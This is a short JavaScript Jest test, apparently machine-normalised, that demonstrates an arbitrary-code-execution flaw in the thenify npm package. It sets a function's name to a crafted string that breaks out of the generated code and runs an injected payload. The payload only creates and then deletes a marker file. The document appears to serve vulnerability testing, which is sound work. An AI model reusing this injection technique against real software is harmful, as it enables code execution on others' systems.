const v27 = () => {
    const v15 = expect.assertions(2);
    v15;
    const fs = require('fs');
    const a = require('thenify');
    const path = './thenify';
    let payload = 'fs=require(\'fs\');fs.writeFileSync(\'thenify\',\'\',)';
    data = {};
    file_exist = fs.existsSync(path);
    const v16 = expect(file_exist);
    const v17 = v16.toBe(false);
    v17;
    try {
        const cur = function () {
        };
        const v18 = 'fake() {' + payload;
        const v19 = v18 + ';})();(function(){//';
        const v20 = { value: v19 };
        const v21 = Object.defineProperty(cur, 'name', v20);
        v21;
        const v22 = a(cur);
        v22;
    } catch (error) {
    }
    file_exist = fs.existsSync(path);
    const v23 = expect(file_exist);
    const v24 = v23.toBe(true);
    v24;
    const v25 = function (err) {
    };
    const v26 = fs.unlink(path, v25);
    v26;
};
const v28 = test('Arbitrary code execution in thenify', v27);
v28;